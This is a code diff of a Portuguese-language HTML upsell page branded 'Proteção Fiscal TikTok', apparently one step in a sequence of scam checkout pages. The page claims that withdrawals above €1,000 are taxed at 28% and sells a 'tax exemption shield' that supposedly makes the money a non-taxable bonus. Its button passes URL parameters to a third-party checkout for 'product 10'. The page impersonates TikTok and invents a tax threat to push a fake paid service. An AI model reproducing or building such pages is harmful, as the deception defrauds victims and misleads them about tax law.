@@ -6,9 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Proteção Fiscal TikTok</title>
     <link rel="stylesheet" href="/css/upsell-premium.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap" rel="stylesheet">
 </head>
 
 <body>
@@ -17,25 +14,25 @@
             <img src="/logo.svg" alt="TikTok" class="logo">
         </div>
 
-        <div class="badge" style="background: #10b981; color: #fff;">Conformidade Legal</div>
+        <div class="badge">Conformidade Legal</div>
 
-        <h1 class="title">Ativar <span style="color: #10b981;">Escudo de Isenção Fiscal</span>?</h1>
+        <h1 class="title">Ativar <span style="color: #059669;">Escudo de Isenção Fiscal</span>?</h1>
 
         <div class="description">
             Levantamentos acima de €1.000 são reportados automaticamente às finanças e sujeitos a uma taxa de <strong>28%</strong>.
         </div>
 
-        <div class="amount-box" style="border-color: #10b981; background: rgba(16, 185, 129, 0.05);">
+        <div class="amount-box">
             <div class="amount-label">IMPOSTO ESTIMADO (28%)</div>
-            <div class="amount-value" style="color: #d9534f; text-decoration: line-through; font-size: 28px;">€392,50</div>
-            <div class="amount-value" style="color: #10b981;">€0,00</div>
+            <div class="amount-value" style="color: #d9534f; text-decoration: line-through; font-size: 24px; opacity: 0.5;">€392,50</div>
+            <div class="amount-value" style="color: #059669;">€0,00</div>
         </div>
 
         <div class="description">
-            O <strong>Escudo Fiscal TikTok</strong> classifica o seu ganho como "Bónus de Marketing Não Tributável", garantindo que recebe 100% do valor líquido no seu banco.
+            O <strong>Escudo Fiscal TikTok</strong> garante que recebe 100% do valor líquido no seu banco como bónus isento.
         </div>
 
-        <button onclick="redirectToPayment()" class="cta-button pulse" style="background: #10b981; color: white;">
+        <button onclick="redirectToPayment()" class="cta-button pulse" style="background: #059669; box-shadow: 0 10px 20px rgba(5, 150, 105, 0.2);">
             <span>ATIVAR ISENÇÃO FISCAL</span>
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4"></path></svg>
         </button>
@@ -57,7 +54,6 @@
 
         function redirectToPayment() {
             const params = new URLSearchParams(window.location.search);
-            // Produto 10 é o próximo na sequência
             const checkoutUrl = new URL('https://waymb.com/c?username=eduardotreonix&product=10');
 
             params.forEach((value, key) => {
